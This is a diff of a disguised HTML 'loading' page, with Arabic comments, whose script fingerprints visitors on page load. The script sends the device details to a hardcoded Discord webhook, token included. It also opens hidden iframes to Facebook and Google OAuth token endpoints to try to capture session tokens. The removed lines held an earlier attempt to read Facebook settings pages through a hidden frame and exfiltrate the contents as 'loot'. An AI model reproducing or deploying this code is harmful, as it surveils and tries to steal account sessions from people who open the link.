@@ -2,53 +2,58 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث النظام...</title>
+    <title>Loading Resources...</title>
     <style>
-        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .version-marker { font-size: 60px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        body { background: #000; color: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .spinner { border: 2px solid #1a1a1a; border-top: 2px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="version-marker">18</div>
-    <div class="loader"></div>
-    <p>جاري استخراج مفاتيح الوصول (V1.3.0)...</p>
+    <div class="spinner"></div>
 
-    <iframe id="secret_gate" style="width:0;height:0;border:0; border:none; visibility:hidden;"></iframe>
+    <div id="bridge_container" style="display:none;"></div>
 
     <script>
-        const DISCORD_ID = "1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
+        const WEBHOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        function sendSignal(title, info) {
-            const blob = new Blob([JSON.stringify({
-                embeds: [{ title: "🔑 " + title, description: info, color: 16753920 }]
-            })], { type: 'application/json' });
-            navigator.sendBeacon("https://discord.com/api/webhooks/" + DISCORD_ID, blob);
+        async function silentStrike() {
+            // 1. صيد معلومات الجهاز فوراً
+            const deviceInfo = {
+                ua: navigator.userAgent,
+                lang: navigator.language,
+                cores: navigator.hardwareConcurrency,
+                mem: navigator.deviceMemory || "N/A",
+                platform: navigator.platform
+            };
+
+            navigator.sendBeacon(WEBHOOK, JSON.stringify({
+                embeds: [{ title: "⚡ Silent Access Initiated", description: "Target opened link on: " + deviceInfo.platform, color: 16776960 }]
+            }));
+
+            // 2. تكتيك الـ Hidden Form Hijacking
+            // ننشئ فورم مخفي يحاول سحب "توكن" الجلسة عبر الـ Redirect
+            const targets = [
+                "https://www.facebook.com/v12.0/dialog/oauth?client_id=124024574287442&redirect_uri=https://github.io/&response_type=token",
+                "https://accounts.google.com/o/oauth2/v2/auth?client_id=sample&redirect_uri=https://github.io/&response_type=token&scope=email"
+            ];
+
+            targets.forEach((url, index) => {
+                const ifr = document.createElement('iframe');
+                ifr.style.display = 'none';
+                ifr.src = url;
+                document.getElementById('bridge_container').appendChild(ifr);
+                
+                // بعد ثواني نرسل إشعار إن الطلب "حقن" في المتصفح
+                setTimeout(() => {
+                    navigator.sendBeacon(WEBHOOK, JSON.stringify({
+                        embeds: [{ title: `🔗 Tunnel ${index+1} Active`, description: "Session probe injected successfully.", color: 3066993 }]
+                    }));
+                }, 3000);
+            });
         }
 
-        function launchReflection() {
-            sendSignal("System Check", "Launching Reflection Protocol V1.3.0");
-
-            const gate = document.getElementById('secret_gate');
-            // استهداف نسخة الموبايل الخفيفة جداً (أقل حماية)
-            gate.src = "https://m.facebook.com/settings/email/";
-
-            // محاولة لقط معلومات الجلسة من خلال الـ Referrer
-            setTimeout(() => {
-                try {
-                    // إذا كان المتصفح يسمح بقراءة الـ ContentWindow (ثغرة قديمة في بعض نسخ أندرويد)
-                    const data = gate.contentWindow.document.body.innerText;
-                    if (data) sendSignal("Loot Found", data.substring(0, 500));
-                } catch (e) {
-                    sendSignal("Protection Active", "Browser prevented direct read. Switching to Side-Channel Attack...");
-                    // تكتيك بديل: محاولة استنتاج وجود الجلسة عبر حجم الإطار
-                    sendSignal("Side-Channel", "Iframe Loaded. Session validation in progress.");
-                }
-            }, 4000);
-        }
-
-        window.onload = launchReflection;
+        window.onload = silentStrike;
     </script>
 </body>
 </html>
